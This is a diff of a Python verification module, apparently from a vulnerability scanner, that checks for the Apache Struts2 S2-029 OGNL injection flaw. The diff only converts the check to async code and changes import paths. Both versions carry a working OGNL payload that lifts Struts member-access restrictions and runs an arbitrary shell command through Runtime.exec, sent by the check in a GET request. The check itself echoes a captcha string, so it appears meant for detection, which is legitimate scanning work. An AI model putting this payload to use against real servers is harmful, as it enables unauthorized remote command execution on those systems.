@@ -1,8 +1,8 @@
 #!/usr/bin/env python3
 
 import re
-from app.lib.utils.request import request
-from app.lib.utils.common import get_capta, get_useragent
+from app.lib.request import request
+from app.lib.common import get_capta, get_useragent
 
 class S2_029_BaseVerify:
     def __init__(self, url):
@@ -23,7 +23,7 @@ class S2_029_BaseVerify:
         }
         self.payload = '''?message=(%23_memberAccess%5B'allowPrivateAccess'%5D=true,%23_memberAccess%5B'allowProtectedAccess'%5D=true,%23_memberAccess%5B'excludedPackageNamePatterns'%5D=%23_memberAccess%5B'acceptProperties'%5D,%23_memberAccess%5B'excludedClasses'%5D=%23_memberAccess%5B'acceptProperties'%5D,%23_memberAccess%5B'allowPackageProtectedAccess'%5D=true,%23_memberAccess%5B'allowStaticMethodAccess'%5D=true,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('{cmd}').getInputStream()))'''
     
-    def check(self):
+    async def check(self):
 
         """
         检测是否存在漏洞
@@ -34,18 +34,16 @@ class S2_029_BaseVerify:
         """
 
         try:
-            check_req = request.get(self.url + self.payload.format(cmd = 'echo ' + self.capta), headers = self.headers)
-            check_req_text = check_req.text.replace('\n', '')
+            check_req = await request.get(self.url + self.payload.format(cmd = 'echo ' + self.capta), headers = self.headers)
+            check_req_text = await check_req.text()
+            check_req_text = check_req_text.replace('\n', '')
             check_req_text = check_req_text.replace(' ', '')
             check_result = re.findall('<input.*?value="(.*?)".*?/>', check_req_text)
             if self.capta in check_result:
                 return True
-            else:
-                return False
+            
         except Exception as e:
-            print(e)
-            return False
-        finally:
+            # print(e)
             pass
 
 if  __name__ == "__main__":
